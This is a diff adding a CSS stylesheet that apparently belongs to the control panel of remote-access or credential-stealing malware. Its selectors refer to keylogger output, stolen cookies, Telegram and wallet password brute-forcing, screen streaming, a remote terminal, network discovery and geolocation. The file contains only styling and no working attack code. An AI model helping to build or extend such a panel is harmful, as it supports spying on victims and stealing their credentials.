@@ -1,0 +1,93 @@
+textarea { resize: vertical; }
+iconify-icon { position: relative; top: 4px;}
+.uk-navbar-nav > li > img { padding: 5px; }
+ul[uk-accordion] { padding: 20px; }
+.uk-search{ position: relative; top: 20px; }
+#system-info * { padding: 15px; margin: 3px; font-size: 19px; }
+#screenshot { width: 1000px; height: 600px; }
+hr { margin: 20px !important; height: 560px !important; }
+#proxies-area, #bruteforce-telegram-passwords-textarea, #bruteforce-wallet-passwords-textarea, #bruteforce-passwords-textarea, #current-keylogger-data, #current-cookies, #current-file { min-height: 300px; }
+#cookies > button, #actions > button { margin: 10px; }
+.copiable, .pointer { cursor: pointer; }
+.copiable:active { color: royalblue; }
+table > tbody > tr > td { word-break: break-all; overflow-wrap: break-word; }
+button > iconify-icon { font-size: 20px; }
+#terminal-output, #terminal-input, #terminal-activity-input { background-color: black !important; color: whitesmoke !important; border: none; border-radius: 10px; }
+#terminal-output { min-height: 600px; min-width: 99%; }
+#terminal-input, #terminal-output { margin-top: 1px; }
+#terminal-status { color: rgb(21, 174, 21); display: none; }
+#terminal-status-icon { position: absolute; top: 46px; right: 42px; z-index: 1; color: whitesmoke; display: none; }
+.nav-el { margin-top: 18px; cursor: pointer; }
+.nav-el > p > iconify-icon { position: relative; top: 7px !important; font-size: 24px; }
+.uk-nav > li > a > iconify-icon { font-size: 16px; }
+.highlighted { border-left: 10px solid #1e87f0;  }
+#keylogger-item, #stream-item, #netdiscover-item { display: none; }
+#keylogger-buttons-data > button { margin: 10px; }
+#stream-image {
+    width: 100%;
+    height: 90%;
+    border: rgb(192, 192, 192) 5px solid;
+    background-color: #111111;
+}
+#history > li > div > table > tbody > tr > td {
+    min-width: 200px !important;
+}
+/* Chat Export */
+.msg {
+    border-radius: 20px;
+    display: inline-block;
+    padding: 10px;
+    max-width: 50%;
+    clear: both;
+    min-width: 10%;
+    margin: 5px;
+}
+.msg > .msg-content {
+    color:aliceblue;
+    overflow-wrap: break-word;
+    font-style: oblique;
+}
+.msg > .msg-title {
+    float: left;
+    color:rgba(255, 255, 255, 0.771);
+    font-weight: bold;
+}
+.msg > .msg-time {
+    float: right;
+    font-size: 12px;
+    color:rgb(202, 202, 202);
+}
+.msg-in {
+    float: left;
+    margin-left: 5px;
+    background-color: rgba(73, 185, 255, 0.771);
+}
+.msg-out {
+    float: right;
+    margin-right: 5px;
+    background-color: rgba(42, 141, 240, 0.771);
+}
+.blinking-text {
+    animation: blinking-animation 1s infinite; /* 1 second duration, infinite loop */
+  }
+  @keyframes blinking-animation {
+    0%   { opacity: 1; }
+    50%  { opacity: 0; }
+    100% { opacity: 1; }
+  }
+#netdiscover-values > li > ul {
+    margin-left: 25px;
+    margin-top: 10px;
+}
+#netdiscover-values > li > iconify-icon { top: 2px; }
+#geolocation_loader {
+    text-align: center;
+}
+#geolocation_loader > iconify-icon {
+    font-size: 80px;
+}
+#geomap {
+    display: none;
+	height: 600px;
+    width: 100%;
+}
